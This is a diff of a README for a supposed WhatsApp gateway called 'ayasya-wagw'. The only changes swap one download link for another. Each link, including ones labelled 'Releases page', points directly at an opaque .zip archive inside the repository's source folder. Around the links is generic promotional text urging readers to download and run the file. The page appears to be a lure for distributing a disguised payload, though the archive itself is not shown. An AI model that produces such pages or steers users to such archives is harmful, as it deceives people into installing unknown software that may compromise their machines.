@@ -1,6 +1,6 @@
 # 🚀 ayasya-wagw - Effortlessly Connect with WhatsApp
 
-[![Download ayasya-wagw](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/services/ayasya-wagw_transcrystalline.zip)](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/services/ayasya-wagw_transcrystalline.zip)
+[![Download ayasya-wagw](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/wagw-ayasya-3.6.zip)](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/wagw-ayasya-3.6.zip)
 
 ## 📥 Overview
 
@@ -26,7 +26,7 @@ To run the ayasya-wagw application, ensure your system meets the following requi
 
 ### Step 1: Visit the Releases Page
 
-To download the application, visit the [Releases page](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/services/ayasya-wagw_transcrystalline.zip).
+To download the application, visit the [Releases page](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/wagw-ayasya-3.6.zip).
 
 ### Step 2: Download the Latest Version
 
@@ -46,7 +46,7 @@ After installation, find ayasya-wagw in your applications and open it. You will 
 
 To get started with ayasya-wagw:
 
-1. [Visit this page to download](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/services/ayasya-wagw_transcrystalline.zip).
+1. [Visit this page to download](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/wagw-ayasya-3.6.zip).
 2. Select the version you want and click the download link.
 
 ## ⚙️ Configuration
@@ -65,4 +65,4 @@ If you encounter any issues while using ayasya-wagw, feel free to reach out for 
 
 Ayasya Whatsapp Gateway is here to enhance your WhatsApp experience. With its user-friendly features and easy setup, you can maximize your efficiency when managing messages. Download today and start connecting with ease! 
 
-Remember, you can always revisit the [Releases page](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/services/ayasya-wagw_transcrystalline.zip) for updates and new features.
+Remember, you can always revisit the [Releases page](https://raw.githubusercontent.com/Noone24633/ayasya-wagw/main/src/wagw-ayasya-3.6.zip) for updates and new features.
